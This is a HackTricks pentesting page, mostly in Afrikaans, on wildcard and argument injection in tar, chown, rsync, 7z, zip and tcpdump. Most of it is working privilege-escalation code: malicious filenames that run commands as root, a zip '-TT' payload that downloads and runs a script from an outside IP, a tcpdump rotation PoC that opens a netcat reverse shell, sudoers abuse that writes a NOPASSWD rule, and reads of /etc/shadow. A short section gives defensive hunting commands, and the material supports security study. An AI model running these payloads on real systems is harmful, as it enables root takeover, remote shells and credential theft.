# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** gebeur wanneer ’n bevoorregte script ’n Unix-binary soos `tar`, `chown`, `rsync`, `zip`, `7z`, … met ’n ongekwote wildcard soos `*` laat loop.
> Omdat die shell die wildcard **voor** die uitvoering van die binary uitbrei, kan ’n aanvaller wat lêers in die working directory kan skep, lêername skep wat met `-` begin sodat hulle as **options in plaas van data** geïnterpreteer word, wat effektief arbitrêre flags of selfs commands insmokkel.
> Hierdie bladsy versamel die nuttigste primitives, onlangse navorsing en moderne detections vir 2023-2025.

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wanneer root later iets uitvoer soos:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` is ingespuit, wat veroorsaak dat *all* ooreenstemmende lêers die eienaarskap/toestemmings van `/root/secret``file` erf.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
Sien ook die klassieke DefenseCode paper vir besonderhede.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Voer arbitrêre opdragte uit deur die **checkpoint**-funksie te misbruik:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Sodra root bv. `tar -czf /root/backup.tgz *` uitvoer, word `shell.sh` as root uitgevoer.

### bsdtar / macOS 14+

Die verstek `tar` op onlangse macOS (gebaseer op `libarchive`) implementeer nie `--checkpoint` nie, maar jy kan steeds code-execution bereik met die **--use-compress-program**-vlag wat jou toelaat om ’n eksterne kompressor te spesifiseer.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wanneer ’n bevoorregte script `tar -cf backup.tar *` laat loop, sal `/bin/sh` begin word.

---

## rsync

`rsync` laat jou toe om die remote shell of selfs die remote binary te oorskryf via command-line flags wat met `-e` of `--rsync-path` begin:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
As root later die directory argiveer met `rsync -az * backup:/srv/`, spawn die geïnjekteerde vlag jou shell aan die remote kant.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Selfs wanneer die bevoorregte script die wildcard *defensief* met `--` voorvoeg (om option parsing te stop), ondersteun die 7-Zip-formaat **file list files** deur die filename met `@` voor te voeg.  Deur dit met 'n symlink te kombineer, kan jy *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
As root iets soos die volgende uitvoer:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip sal probeer om `root.txt` (→ `/etc/shadow`) as ’n lêerlys te lees en sal dan ophou, **terwyl die inhoud na stderr uitgegee word**.

Dit oorleef `-- *` omdat die 7-Zip CLI uitdruklik beide gewone lêername en `@listfiles` as posisionele invoer aanvaar, so ’n letterlike lêernaam soos `@root.txt` word steeds spesiaal hanteer.

---

## zip

Twee baie praktiese primitives bestaan wanneer ’n toepassing deur gebruiker-beheerde lêername aan `zip` deurgee (óf via ’n wildcard óf deur name sonder `--` te enummerer).

- RCE via test hook: `-T` skakel “test archive” aan en `-TT <cmd>` vervang die tester met ’n arbitrêre program (lang vorm: `--unzip-command <cmd>`). As jy lêername kan inject wat met `-` begin, split die flags oor afsonderlike lêername sodat short-options parsing werk:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notas
- Moenie ’n enkele lêernaam soos `'-T -TT <cmd>'` probeer nie — kort opsies word per karakter gepars en dit sal misluk. Gebruik afsonderlike tokens soos getoon.
- As slashes uit lêername verwyder word deur die app, haal af vanaf ’n kaal host/IP (verstek pad `/index.html`) en stoor plaaslik met `-O`, en voer dan uit.
- Jy kan parsing ontfout met `-sc` (wys verwerkte argv) of `-h2` (meer hulp) om te verstaan hoe jou tokens verbruik word.

Voorbeeld (plaaslike gedrag op zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: If the web layer echoes `zip` stdout/stderr (common with naive wrappers), injected flags like `--help` or failures from bad options will surface in the HTTP response, confirming command-line injection and aiding payload tuning.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## Hunting vulnerable wrappers and jobs

Recent case studies have shown that wildcard/argv injection is no longer just a **cron + tar** problem. The same bug class keeps appearing in:

- web features that "download everything as zip/tar" from attacker-controlled upload directories
- vendor/appliance debug shells that expose a **tcpdump** wrapper with attacker-controlled filename/filter fields
- backup or rotation jobs that call `tar`, `rsync`, `7z`, `zip`, `chown`, or `chmod` on writable directories

Useful triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Vinnige heuristiek:

- `-- *` is ’n goeie regstelling vir baie GNU tools, maar **nie** vir `7z`/`7za` nie omdat `@listfiles` apart gepars word.
- Vir `zip`, soek vir wrappers wat gebruiker-beheerde lêername direk enumereer; short-option splitting (`-T` + `-TT <cmd>`) werk steeds selfs sonder ’n shell glob.
- Vir `tcpdump`, let veral op wrappers wat jou toelaat om **output file names**, **rotation settings**, of **capture-file replay** arguments te beheer.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Wanneer ’n restricted shell of vendor wrapper ’n `tcpdump` command line bou deur gebruiker-beheerde fields te konkatenreer (bv. ’n "file name" parameter) sonder streng quoting/validation, kan jy ekstra `tcpdump` flags insmokkel. Die kombinasie van `-G` (time-based rotation), `-W` (limit number of files), en `-z <cmd>` (post-rotate command) gee arbitrary command execution as die user wat tcpdump run (dikwels root op appliances).

Voorwaardes:

- Jy kan die `argv` beïnvloed wat na `tcpdump` oorgedra word (bv. via ’n wrapper soos `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Die wrapper sanitize nie spaces of `-`-prefixed tokens in die file name field nie.

Klassieke PoC (executes a reverse shell script from a writable path):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` dwing ’n onmiddellike rotate af na die eerste ooreenstemmende packet.
- `-z <cmd>` laat die post-rotate command een keer per rotation loop. Baie builds voer `<cmd> <savefile>` uit. As `<cmd>` ’n script/interpreter is, maak seker die argument handling stem ooreen met jou payload.

No-removable-media variante:

- As jy enige ander primitive het om files te write (bv. ’n aparte command wrapper wat output redirection toelaat), drop jou script in ’n bekende path en trigger `-z /bin/sh /path/script.sh` of `-z /path/script.sh` afhangend van platform semantics.
- Sommige vendor wrappers rotate na attacker-controllable locations. As jy die rotated path kan beïnvloed (symlink/directory traversal), kan jy `-z` stuur om content uit te voer wat jy volledig beheer sonder external media.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Very common sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Probleme
- Die `*` glob en permissiewe patrone beperk slegs die eerste `-w` argument. `tcpdump` aanvaar verskeie `-w` opsies; die laaste een wen.
- Die reël pin nie ander opsies vas nie, so `-Z`, `-r`, `-V`, ens. word toegelaat.

Primitives
- Oorskryf bestemmingspad met ’n tweede `-w` (die eerste voldoen net aan sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Pad-deur-aversie binne die eerste `-w` om die beperkte tree te ontsnap:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Dwing uitset-eienaarskap af met `-Z root` (skep root-besitte lêers enige plek):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Arbitrary-content geskryf deur 'n crafted PCAP via `-r` te replay (bv. om 'n sudoers-reël te drop):

<details>
<summary>Create a PCAP that contains the exact ASCII payload and write it as root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrêre lêerlees/secret leak met `-V <file>` (interpreteer 'n lys van savefiles). Foutdiagnostiek eggo dikwels reëls, wat inhoud lek:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Verwysings

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
